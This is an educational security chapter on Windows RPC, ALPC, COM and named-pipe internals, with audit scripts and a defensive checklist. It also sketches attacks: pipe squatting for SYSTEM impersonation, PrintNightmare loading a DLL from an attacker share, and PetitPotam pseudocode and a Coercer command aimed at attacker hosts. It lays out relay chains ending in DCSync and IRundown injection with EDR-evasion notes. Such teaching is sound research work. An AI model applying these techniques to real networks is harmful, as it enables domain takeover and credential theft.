# Chapter 05 — RPC, COM, ALPC, and Named Pipes: IPC Security Internals and Attack Patterns

> **Scope:** This chapter covers Windows inter-process communication (IPC) mechanisms as security
> research subjects. Topics span the full stack from named pipe file objects in the kernel through
> ALPC port objects, the RPC runtime, and the COM object model. Attack patterns include endpoint
> enumeration, privilege coercion via impersonation, authentication coercion across the network,
> and the root cause analysis of PrintNightmare as a synthesis case study.

---

## 1. The Four-Layer IPC Stack

Windows IPC is not a single mechanism — it is a stack of four distinct layers, each adding
security semantics on top of the layer below. Every major IPC-based vulnerability lives at
exactly one layer of this stack, and fixing it requires understanding which layer failed.

```
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 4: COM OBJECT MODEL                                           │
│  CoCreateInstance, class factories, DCOM activation, elevation       │
│  Security controls: LaunchPermission SD, AccessPermission SD,        │
│  RunAs identity, authentication/impersonation levels per-call        │
└─────────────────────────────────┬───────────────────────────────────┘
                                  ↓
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 3: RPC RUNTIME (MSRPC)                                        │
│  Interface UUID, binding handle, NDR marshaling, security callback   │
│  Security controls: AuthenticationLevel, ImpersonationLevel,         │
│  per-interface security callback, endpoint DACL                      │
└──────────────┬──────────────────┬──────────────────────────────────┘
               ↓                  ↓                        ↓
┌──────────────────┐  ┌───────────────────┐  ┌───────────────────────┐
│  ncalrpc         │  │  ncacn_np         │  │  ncacn_ip_tcp         │
│  (ALPC kernel)   │  │  (Named Pipe)     │  │  (TCP socket)         │
└──────────────────┘  └───────────────────┘  └───────────────────────┘
               ↓                  ↓
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 1: NT KERNEL                                                  │
│  ALPC port objects (_ALPC_PORT), Named Pipe file objects             │
│  Security controls: object security descriptor (DACL/SACL),         │
│  mandatory integrity check on port connection                        │
└─────────────────────────────────────────────────────────────────────┘
```

**Mental model for attack research:** To exploit a target service, you need to
(a) reach the service at the transport layer (ALPC port or named pipe DACL must permit your
connection), then (b) authenticate at the RPC layer (authentication level), then (c) have
the COM activation or RPC access check succeed. A bug at *any* layer creates an attack surface.

---

## 2. RPC Architecture: Client, Server, Stubs, and NDR

### 2.1 Interface Definition and NDR Marshaling

An RPC interface is defined in IDL (Interface Definition Language). The MIDL compiler produces:
- **Client stub**: serializes (marshals) call arguments into NDR wire format, sends them
- **Server stub**: deserializes arguments from NDR format, dispatches to the implementation
- **Header file**: shared type definitions

NDR (Network Data Representation) is the binary serialization format. NDR type definitions are
embedded in the compiled stubs and referenced at runtime by a pointer in the RPC dispatch table
(`MIDL_SERVER_INFO → pTransferSyntax`).

**Security implication of NDR:** Bugs in NDR deserialization (integer overflow in array size
calculation, type confusion in union variants, pointer validation) have historically produced
exploitable memory corruption in the RPC server. These are server-side parse bugs triggered by
malformed client packets — the attack surface is the NDR wire format.

### 2.2 RPC Security: Authentication Levels

The RPC runtime supports six authentication levels, applied per-binding handle:

| Constant | Value | What is Protected |
|---|---|---|
| `RPC_C_AUTHN_LEVEL_NONE` | 1 | Nothing — fully anonymous |
| `RPC_C_AUTHN_LEVEL_CONNECT` | 2 | Connection establishment only |
| `RPC_C_AUTHN_LEVEL_CALL` | 3 | Each call header |
| `RPC_C_AUTHN_LEVEL_PKT` | 4 | All packets (authenticity) |
| `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` | 5 | All packets (signing) |
| `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` | 6 | All packets (signing + encryption) |

**Research implication:** Interfaces configured with `NONE` or `CONNECT` can be called without
valid credentials. During the PrintNightmare era (2021), `MS-RPRN` accepted calls with
`RPC_C_AUTHN_LEVEL_NONE` from domain users — a key reason unauthenticated exploitation was
initially possible.

### 2.3 RPC Security: Impersonation Levels

| Constant | What the Server Can Do |
|---|---|
| `RPC_C_IMP_LEVEL_ANONYMOUS` | Server cannot identify caller |
| `RPC_C_IMP_LEVEL_IDENTIFY` | Server reads token (SID, groups) but cannot use it |
| `RPC_C_IMP_LEVEL_IMPERSONATE` | Server can fully impersonate caller locally |
| `RPC_C_IMP_LEVEL_DELEGATE` | Server can impersonate caller on other machines (Kerberos) |

**Attack direction is reversed from intuition:** The server impersonating the client does NOT
gain elevation. A SYSTEM server impersonating a standard-user client receives a standard-user
token — a *downgrade*. The attack model is different: the *attacker acts as the server*, and
the *victim is the client*. When a privileged client calls an attacker's server at
`IMPERSONATE` level, the attacker's server calls `RpcImpersonateClient()` and obtains the
privileged token. This is the basis of all named-pipe impersonation attacks (PrintSpoofer,
RoguePotato, etc.).

### 2.4 Security Callback

An RPC server can register a **security callback** function for each interface:

```c
RPC_STATUS CALLBACK SecurityCallback(
    RPC_IF_HANDLE Interface,
    void *Context)
{
    RPC_CALL_ATTRIBUTES_V2 attrs = { .Version = 2 };
    RpcServerInqCallAttributes(Context, &attrs);

    // Check authentication level
    if (attrs.AuthenticationLevel < RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
        return RPC_S_ACCESS_DENIED;

    // Check caller identity
    // ... ImpersonateClient() → GetTokenInformation() → RevertToSelf()

    return RPC_S_OK;  // Allow
}

RpcServerRegisterIfEx(MyInterface_v1_0_s_ifspec,
    NULL, NULL,
    RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH,
    RPC_C_LISTEN_MAX_CALLS_DEFAULT,
    SecurityCallback);
```

The security callback is the primary per-interface access control mechanism. A missing or
incorrect security callback is the first thing to look for when auditing an RPC server.

### 2.5 Enumerating Live RPC Endpoints

Using NtObjectManager (PowerShell):

```powershell
# Enumerate all RPC servers currently running (parses loaded modules in all processes)
$servers = Get-RpcServer -ParseProcess

# Show servers with no authentication requirement
$servers | Where-Object { $_.AuthType -eq 'None' -or $_.AuthLevel -le 2 }

# Get endpoints for a specific interface UUID
Get-RpcEndpoint -InterfaceId "12345778-1234-abcd-ef00-0123456789ab"

# Check who can call a specific ncalrpc endpoint
$ep = Get-RpcEndpoint | Where-Object { $_.Endpoint -like "*spoolss*" }
Get-AccessibleRpcEndpoint -Endpoint $ep
```

Using RpcView (GUI):
1. Launch RpcView as Administrator
2. "Processes" tab → select target process → shows all registered interfaces
3. Right-click interface → "Decompile" → generates approximate IDL
4. Cross-reference UUID with Microsoft protocol documentation

**Audit priority:** Interfaces with `AuthenticationLevel = None/Connect` that run as SYSTEM
or LocalService are the highest-priority targets. Every such interface is a potential LPE if
it accepts user-influenced parameters.

---

## 3. ALPC Internals

### 3.1 Port Object Hierarchy

ALPC (Advanced Local Procedure Call) is the kernel-mode IPC primitive underlying all local
RPC calls (`ncalrpc`), COM inter-process calls, and many Windows system services.

Three distinct port object types:

```
NtAlpcCreatePort("\RPC Control\MyServer", SD)
  → Creates: SERVER PORT (_ALPC_PORT, Type=Server)
    Security descriptor SD controls: who can CONNECT

NtAlpcConnectPort("\RPC Control\MyServer", ...)
  → Creates (atomically):
    CONNECTION PORT (_ALPC_PORT, Type=Connection) — server-side per-client
    COMMUNICATION PORT (_ALPC_PORT, Type=Communication) — client-side
    
NtAlpcSendWaitReceivePort(...)
  → Sends/receives messages through the communication ports
    Messages carry: data payload + optional port attributes
```

Object namespace path for RPC-created ALPC ports: `\RPC Control\<EndpointName>`

### 3.2 ALPC Message Attributes

ALPC messages can carry structured **port message attributes** beyond the raw data payload.
These attributes are the mechanism for rich IPC semantics:

| Attribute Type | Purpose | Security Implication |
|---|---|---|
| **SecurityAttribute** | Client security context (token reference) | Server calls `NtAlpcImpersonateClientOfPort()` to impersonate |
| **ViewAttribute** | Shared memory section mapping | Bypasses per-message size limits; content must be validated by server |
| **HandleAttribute** | Kernel handle passing | Server receives a handle to a kernel object in client's table |
| **ContextAttribute** | Client-defined context handle | Correlates requests in stateful protocols |
| **DirectAttribute** | Direct memory access | Fast path for large data |

**Security implications:**
- **SecurityAttribute**: If a server impersonates via `NtAlpcImpersonateClientOfPort()`, it
  gains the client's token. This is safe for SYSTEM→user (downgrade), but dangerous if
  abused (attacker server, privileged client).
- **HandleAttribute**: A client can pass a handle to any object it can open. The server
  receives a handle to that same object in the server's process. This is the mechanism
  for cross-process handle duplication without `DuplicateHandle`.
- **ViewAttribute**: Shared memory mapped via ALPC means the client can modify the
  "received" data while the server is processing it — a TOCTOU if the server reads
  fields twice.

### 3.3 ALPC Security: Port Security Descriptor

When a server creates an ALPC port, it specifies a security descriptor controlling who can
**connect** to the port. If the SD allows `Everyone: ALPC_PORT_CONNECT`, any process can
connect regardless of integrity level.

```powershell
# Check ALPC port security descriptor
$port = Get-NtAlpcServer -Path \RPC Control\MyServer
Get-NtSecurityDescriptor -Object $port | Show-NtSecurityDescriptor

# Enumerate all ALPC ports accessible to current user
Get-AccessibleAlpcPort -Path \RPC Control
```

An ALPC port with a permissive SD that connects to a privileged server is an attack surface:
a low-integrity (sandboxed) process may be able to communicate with a SYSTEM service if the
port SD has no integrity level restriction.

### 3.4 WinDbg ALPC Analysis

```windbg
; List all ALPC ports in the system
!alpc /p <process_addr>

; Dump an ALPC port object
dt nt!_ALPC_PORT <addr>

; Show ALPC connections for a process
!alpc /lpc <eprocess_addr>

; Inspect port security descriptor
dt nt!_ALPC_PORT <addr> SecurityDescriptor
```

---

## 4. COM Activation and Security Model

### 4.1 CoCreateInstance Activation Flow

When user code calls `CoCreateInstance(clsid, ...)`:

```
1. COM runtime queries HKCR\CLSID\{clsid}
   → InprocServer32 (DLL path) OR LocalServer32 (EXE path)
   → AppID reference (optional)

2. If InprocServer32: load DLL into calling process
   Security implication: DLL path from registry → DLL hijacking if path writable

3. If LocalServer32 (out-of-process server):
   a. SCM (Service Control Manager) or DCOM activation:
      → Check AppID's LaunchPermission SD: can caller launch the server?
      → If server is not running: create process with RunAs identity
        (RunAs = "Interactive User", "System", or specific account)
      → If server is already running: attach

4. Once server process runs:
   → Check AppID's AccessPermission SD: can caller call methods?
   → Negotiation of authentication level (AUTHN_LEVEL_xxx)

5. Interface proxy/stub marshaling:
   → Create proxy in client process, stub in server process
   → All calls go through DCOM marshal/unmarshal
```

### 4.2 COM Security Configuration in the Registry

```
HKCR\AppID\{app-guid}\
  ├── RunAs          REG_SZ  "Interactive User" | "NT Authority\SYSTEM" | ".\Username"
  ├── LaunchPermission   REG_BINARY  [DACL-format security descriptor]
  ├── AccessPermission   REG_BINARY  [DACL-format security descriptor]
  └── AuthenticationLevel  REG_DWORD  [RPC_C_AUTHN_LEVEL_xxx]
```

**Attack surface audit:**
```powershell
# Find COM servers running as SYSTEM with permissive launch permissions
Get-ChildItem HKLM:\SOFTWARE\Classes\AppID | ForEach-Object {
    $appid = $_
    $runas = (Get-ItemProperty $appid.PSPath -ErrorAction SilentlyContinue).RunAs
    if ($runas -eq "NT Authority\SYSTEM") {
        [PSCustomObject]@{
            AppID  = $appid.PSChildName
            RunAs  = $runas
            Launch = (Get-ItemProperty $appid.PSPath).LaunchPermission
        }
    }
}

# OleViewDotNet (Forshaw's GUI tool):
# Launch OleViewDotNet → COM Objects → sort by Security → look for
# LaunchPermission that includes Everyone or Authenticated Users
```

### 4.3 COM Impersonation Levels and Attack Surface

When a COM server receives a call, it can impersonate the caller's security context.
The impersonation level is negotiated at client connection time:

```c
// Client specifies impersonation level when connecting
CoInitializeSecurity(NULL, -1, NULL, NULL,
    RPC_C_AUTHN_LEVEL_CALL,
    RPC_C_IMP_LEVEL_IMPERSONATE,  // ← server can act as us
    NULL, EOAC_NONE, NULL);
```

If the COM server is an attacker-controlled out-of-process server and the *victim* is a
privileged COM client (e.g., a SYSTEM service that calls into an attacker-registered CLSID),
the attacker's server can:

1. Receive the COM method call
2. Call `CoImpersonateClient()` (maps to `RpcImpersonateClient()` internally)
3. Obtain the calling thread's impersonation token
4. Token is SYSTEM (or the service's identity) → privilege escalation

This is the COM-server attack model: register a CLSID that a privileged process calls, then
impersonate when the call arrives.

### 4.4 COM Elevation Moniker and Auto-Elevation

Windows Vista+ introduced the **elevation moniker** for requesting elevated COM objects
without requiring the server to run as SYSTEM:

```
"Elevation:Administrator!new:{CLSID}"
```

This triggers a UAC elevation dialog. However, a small set of Microsoft-approved CLSIDs are
marked for **auto-elevation** — they elevate without a prompt:

```powershell
# Enumerate auto-elevated CLSIDs
Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" -Recurse |
  Where-Object { $_.GetValue("AutoElevate") -eq 1 } |
  Select-Object PSPath
```

Auto-elevated COM objects have been a rich UAC bypass source. The attack pattern:
1. Find an auto-elevated COM object with a writable DLL search path
2. The COM activation runs elevated in a DLL surrogate (`dllhost.exe`)
3. Plant a DLL in the search path → DLL loads elevated → code execution at high integrity

---

## 5. Named Pipe Security

### 5.1 Pipe Namespace and Object Manager Integration

```
Win32 path:        \\.\pipe\PipeName
NT object path:    \Device\NamedPipe\PipeName
RPC control path:  \RPC Control\PipeName  (for RPC-created pipes)
```

Named pipes are file objects in the NTFS driver stack, but the device object backing them
is `\Device\NamedPipe` — a driver created by the named pipe filesystem driver (`npfs.sys`),
not NTFS. Pipes do not exist on disk; they are purely in-memory objects.

### 5.2 Pipe DACL: Critical Access Rights

`CreateNamedPipe` accepts a `SECURITY_ATTRIBUTES` parameter specifying the pipe's DACL.
Key access rights:

| Right | Constant | Meaning |
|---|---|---|
| Read Data | `FILE_READ_DATA` | Client can read server's output; server can read client's input |
| Write Data | `FILE_WRITE_DATA` | Client can write to server; server can write to client |
| Create Pipe Instance | `FILE_CREATE_PIPE_INSTANCE` | Who can create additional server-side instances |
| Synchronize | `SYNCHRONIZE` | Required for blocking operations |

**The `FILE_CREATE_PIPE_INSTANCE` right is the squatting defense.** If the pipe is created
with a DACL that denies `Everyone: FILE_CREATE_PIPE_INSTANCE` and only grants it to SYSTEM,
a user-mode process cannot create a second instance to compete with the server.

### 5.3 Named Pipe Squatting Attack

```
PRECONDITION: A privileged service creates \\.\pipe\TargetPipe
              and connects clients after creating it.

ATTACK (race-based):
  1. Attacker calls CreateNamedPipe("\\.\pipe\TargetPipe", PIPE_ACCESS_DUPLEX,
         PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
         10,        // max instances — allow competing instances
         4096, 4096, 0, NULL)
     This succeeds if the first instance hasn't been created yet.

  2. Attacker calls ConnectNamedPipe() — waits for a client

  3. Privileged service (SYSTEM) creates its instance:
     - If the pipe already has an instance from the attacker, the SYSTEM
       service gets a second instance, NOT the attacker's
     - BUT: the first client to connect may connect to the attacker's instance

  4. A client (possibly the SYSTEM service itself) connects to attacker's pipe

  5. Attacker calls ImpersonateNamedPipeClient(hPipe)
     → Receives the client's token (may be SYSTEM)

  6. With the SYSTEM token: SeImpersonatePrivilege → CreateProcessWithToken() → LPE

DEFENSE CHECK: Does the pipe's DACL restrict FILE_CREATE_PIPE_INSTANCE?
  Get-NtFile -Path "\Device\NamedPipe\TargetPipe" | Get-NtSecurityDescriptor
```

### 5.4 ImpersonateNamedPipeClient Mechanics

`ImpersonateNamedPipeClient(hPipe)` calls `NtFsControlFile` with
`FSCTL_PIPE_IMPERSONATE`. The named pipe filesystem driver retrieves the connecting
client's security context (stored when the client called `CreateFile` to connect) and
sets it as the calling thread's impersonation token.

**Requirements for the attack to yield a useful token:**
1. The client must have connected with `SECURITY_IMPERSONATION` level (default for local pipes)
2. The server must hold `SeImpersonatePrivilege` (granted to SYSTEM, LocalService, NetworkService, and members of the Administrators group by default)
3. The impersonated token must be more privileged than the attacker's token

**Impersonation level check:**
```c
// Server-side: check what level we received before impersonating
RPC_STATUS status = RpcImpersonateClient(NULL);
// Or for named pipes:
if (!ImpersonateNamedPipeClient(hPipe))
    return GetLastError();

HANDLE hToken;
OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken);
SECURITY_IMPERSONATION_LEVEL level;
DWORD size;
GetTokenInformation(hToken, TokenImpersonationLevel, &level, sizeof(level), &size);
// level should be SecurityImpersonation (2) or SecurityDelegation (3) to be useful
```

---

## 6. Authentication Coercion: Forcing Outbound Authentication

### 6.1 The Pattern

All authentication coercion bugs share one structural pattern:

```
1. Attacker calls an RPC method on a VICTIM SERVER
2. The method accepts a path parameter controlled by the attacker
3. The server's implementation opens that path (UNC or local)
4. Opening a UNC path → Windows issues NTLM or Kerberos authentication
   to the UNC host
5. Attacker's machine receives the authentication attempt
6. Attacker relays the authentication to:
   - LDAP  → modify AD objects (add machine accounts, set RBCD, etc.)
   - AD CS → request certificate → pass-the-certificate → DA
   - SMB   → code execution (if SMB signing disabled)
```

**Why it is exploitable:** The authentication is sent from the victim server's machine
account or service account — a high-privilege credential. An attacker with any domain user
account can trigger this against domain controllers or high-value servers.

### 6.2 Coercible Interfaces Reference Table

| Interface | Protocol Spec | Auth Requirement | Trigger Method | Status (as of 2024) |
|---|---|---|---|---|
| **MS-RPRN** Print Spooler | MS-RPRN | Domain user | `RpcRemoteFindFirstPrinterChangeNotification` | Coercion still works; DLL injection patched |
| **MS-EFSR** EFS Remote | MS-EFSR | None (pre-patch); domain user (post-patch) | `EfsRpcOpenFileRaw` | Unauthenticated variant patched (CVE-2021-36942); authenticated still works |
| **MS-DFSNM** DFS Namespace | MS-DFSNM | Domain user | `NetrDfsRemoveStdRoot`, `NetrDfsAddStdRoot` | Still functional |
| **MS-FSRVP** Shadow Copy | MS-FSRVP | Typically domain admin | `IsPathSupported`, `IsPathShadowCopied` | High-priv only |
| **MS-PAR** Print Async | MS-PAR | Domain user | Various async notification methods | Still functional |
| **DCOM Activation** | MS-DCOM | Domain user | Remote class activation with UNC moniker | 2024 Forshaw research |
| **MS-EVEN6** Event Log | MS-EVEN6 | Domain user | `EvtRpcRegisterRemoteSubscription` | Limited environments |

### 6.3 MS-RPRN Deep Dive (PrintNightmare Root Cause)

MS-RPRN is the Windows Print Spooler's RPC interface. Two separate vulnerabilities were
disclosed simultaneously in 2021 under the "PrintNightmare" label:

**CVE-2021-1675 / CVE-2021-34527 — DLL Injection via AddPrinterDriverEx**

Root cause analysis:

```
STEP 1: Client calls RpcAddPrinterDriverEx(server, environment, driverInfo, dwFileCopyFlags)
        driverInfo.pDriverPath = "\\attacker\share\evil.dll"

STEP 2: Spooler service (SYSTEM) validates the path
        Bug pre-patch: validation occurred but was insufficient —
        it only checked that the UNC path was reachable, not that it was a
        trusted printer driver from a signed source

STEP 3: Spooler calls LoadLibrary("\\attacker\share\evil.dll") as SYSTEM
        → attacker DLL executes as SYSTEM
        → full LPE / RCE

WHY RCE: The MS-RPRN interface is accessible to any domain user, including from
         off-machine. Any domain user could call AddPrinterDriverEx on any machine
         running Print Spooler → SYSTEM code execution remotely.

PATCH: Microsoft added driver package signing requirements and ACL checks.
       The DLL loading path was restricted. However:

RESIDUAL: The COERCION primitive (FindFirstPrinterChangeNotification) was NOT
          removed. Any domain user can still call it to force outbound NTLM/Kerberos
          authentication from the Print Spooler service account.
```

**Why domain user access was the critical design flaw:**
MS-RPRN's security callback historically checked only that the caller was a member of
the domain — a wide group in any Active Directory environment. The interface was designed
for printer sharing and the assumption that domain users were trusted operators. In the
post-Kerberos-relay era, this assumption is wrong.

### 6.4 PetitPotam (CVE-2021-36942): Unauthenticated Coercion

**Interface:** MS-EFSR (Encrypting File System Remote Protocol)

**Trigger:**
```python
# Simplified Python pseudocode (impacket-style)
rpctransport = transport.DCERPCTransportFactory(
    "ncacn_np:target[\\pipe\\lsarpc]")
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(MSRPC_UUID_EFSR)

# EfsRpcOpenFileRaw — accepts UNC path, triggers outbound auth
dce.request(EfsRpcOpenFileRaw_request(
    FileName="\\\\attacker\\share\\trigger"
))
```

**Chain to domain compromise:**
```
1. Attacker (no credentials) → calls EfsRpcOpenFileRaw on DC
2. DC (machine account) → authenticates NTLM to attacker
3. Attacker relays NTLM to AD CS HTTP enrollment endpoint
4. Attacker requests certificate for DC machine account
5. Certificate → PKINIT (Kerberos AS-REQ with certificate) → TGT for DC$
6. With DC$ TGT → DCSync → extract all domain hashes → DA
```

**Patch status:**
- Microsoft added authentication requirement to the MS-EFSR interface (Sept 2021)
- Unauthenticated coercion is patched
- Authenticated coercion (valid domain user) still functions in many environments
- PetitPotam with domain user credentials remains a valid coercion technique

### 6.5 The Relay Target Decision Matrix

When coercion produces an NTLM/Kerberos authentication, the value depends on the relay target:

| Relay Target | Required Conditions | Outcome |
|---|---|---|
| **LDAP (plain)** | No LDAP signing enforced | Create machine account, set RBCD, modify ACEs |
| **LDAPS** | No LDAP channel binding | Same as LDAP |
| **AD CS (HTTP enrollment)** | AD CS installed with Web Enrollment | Certificate → Kerberos TGT |
| **SMB on another host** | SMB signing disabled | Code execution on relay target |
| **Same host SMB** | Blocked by default (loopback auth restriction) | Usually fails |
| **Kerberos (RBCD)** | Kerberos ticket available, target has SPN | Resource-Based Constrained Delegation |

---

## 7. COM IRundown::DoCallback — Cross-Process Injection via COM

`IRundown` is an undocumented COM runtime interface registered in every COM-initialized
process. It is used internally by COM to notify processes that objects are being released.
The `DoCallback` method accepts a function pointer and data pointer and calls the function
in the target process's context — an intended COM mechanism repurposed as a code injection
primitive.

```
ATTACK:
1. Enumerate COM-initialized processes:
   Get-NtAlpcServer | Where-Object { $_.Name -like "*OLE*" }
   (Each COM-initialized process has an ALPC port named \RPC Control\OLE{GUID})

2. Connect to target process's COM runtime via ALPC
   (Using NtApiDotNet or custom DCOM connection code)

3. Query IRundown interface on the target's registered class factory
   (IUnknown::QueryInterface for IRundown's GUID)

4. Call DoCallback(FunctionPointer, DataPointer)
   → Function is called inside the target process
   → If target is SYSTEM, attacker gains SYSTEM code execution

DETECTION EVASION:
  - Does NOT use CreateRemoteThread, WriteProcessMemory, or VirtualAllocEx
  - Standard DCOM API call — looks like legitimate COM communication
  - Many EDRs only hook the "classic" injection APIs

MITIGATIONS:
  - Partially mitigated in newer Windows (additional checks on IRundown callers)
  - Known to EDR vendors; signatures exist for the call pattern
```

---

## 8. Enumeration and Tooling Reference

### 8.1 Complete Enumeration Workflow

```powershell
# ── Step 1: Install tooling ──────────────────────────────────────────
Install-Module NtObjectManager

# ── Step 2: Enumerate all RPC servers ────────────────────────────────
$servers = Get-RpcServer -ParseProcess
$servers | Select-Object ProcessId, FilePath, InterfaceId, AuthType, AuthLevel |
  Where-Object { $_.AuthLevel -le 2 }  # No auth or connect-only auth

# ── Step 3: Find named pipes accessible from current context ─────────
Get-ChildItem \\.\pipe\ | ForEach-Object {
    try {
        $sd = Get-NtSecurityDescriptor -Win32Path "\\.\pipe\$($_.Name)"
        [PSCustomObject]@{ Name = $_.Name; SDDL = $sd.ToSddl() }
    } catch {}
}

# ── Step 4: Enumerate ALPC ports ─────────────────────────────────────
Get-AccessibleAlpcPort -Path "\RPC Control" |
  Format-Table Name, MaxGrantedAccess

# ── Step 5: COM server enumeration ───────────────────────────────────
# Use OleViewDotNet (separate tool, same author):
#   File → View COM Objects → sort by Security → review LaunchPermission

# ── Step 6: Test RPC coercibility ────────────────────────────────────
# Coercer tool:
python3 Coercer.py scan --target <dc_ip> --listener <attacker_ip>
#   Reports which coercion methods are available on target
```

### 8.2 Tool Reference

| Tool | Purpose | Primary Use |
|---|---|---|
| **NtObjectManager** (PowerShell) | RPC/COM/ALPC enumeration, access check | Systematic attack surface mapping |
| **OleViewDotNet** | COM object GUI analysis, AppID security | COM server audit |
| **RpcView** | RPC endpoint visualization, IDL decompilation | Protocol reverse engineering |
| **impacket** | Python RPC/SMB/NTLM/Kerberos implementation | Coercion relay chains, custom RPC clients |
| **Coercer** | Automated coercion testing across all known interfaces | Quick assessment of coercion surface |
| **RPC Firewall** | RPC call filtering and monitoring | Detection and attack surface reduction |
| **pipelist** (Sysinternals) | Named pipe enumeration | Quick pipe inventory |
| **WinObj** (Sysinternals) | Object namespace browser | \RPC Control\ pipe namespace |

---

## 9. Defensive Audit Checklist for RPC/COM Services

1. **Authentication level**: Does every registered interface enforce at minimum `PKT_INTEGRITY`?
   `RPC_C_AUTHN_LEVEL_NONE` or `CONNECT` on a SYSTEM service = critical finding.

2. **Security callback**: Does every interface have a security callback? Does it correctly
   validate authentication level AND caller identity?

3. **Named pipe DACL**: Does the pipe restrict `FILE_CREATE_PIPE_INSTANCE` to prevent squatting?
   Does the pipe's SD match the expected client population (not `Everyone: ReadWrite`)?

4. **ALPC port SD**: Does the port SD restrict who can connect? For privileged ports, does the
   SD enforce a minimum integrity level (e.g., `ML:M` for medium)?

5. **COM LaunchPermission / AccessPermission**: Does the AppID restrict these to the expected
   callers? `Everyone: Launch` on a SYSTEM COM server = high-severity finding.

6. **UNC path parameters**: Does any RPC method accept a path parameter that is passed to a
   file open call? If yes = potential coercion vector. Does the server validate that the path
   is local before opening it?

7. **Impersonation level**: When the server impersonates the caller, does it verify the
   impersonation level is acceptable before proceeding? Does it revert promptly after?

---

## References

[R-1] *Windows Internals, Part 1 — ALPC and COM Chapters* — Mark Russinovich, David Solomon, Alex Ionescu, Pavel Yosifovich — https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals

[R-2] *sandbox-attacksurface-analysis-tools (NtObjectManager / OleViewDotNet)* — James Forshaw / Google Project Zero — https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools

[R-3] *RpcView — RPC Endpoint Visualization* — silverf0x — https://github.com/silverf0x/RpcView

[R-4] *tiraniddo.dev — RPC, COM, and ALPC Security Research Series* — James Forshaw — https://www.tiraniddo.dev/

[R-5] *impacket — Python Windows Protocol Implementation* — Fortra / community — https://github.com/fortra/impacket

[R-6] *PetitPotam (CVE-2021-36942) — EFSRPC Authentication Coercion* — topotam (Gilles Lionel) — https://github.com/topotam/PetitPotam

[R-7] *CVE-2021-1675 PrintNightmare PoC* — cube0x0 — https://github.com/cube0x0/CVE-2021-1675

[R-8] *Coercer — Authentication Coercion Testing Tool* — p0dalirius — https://github.com/p0dalirius/Coercer
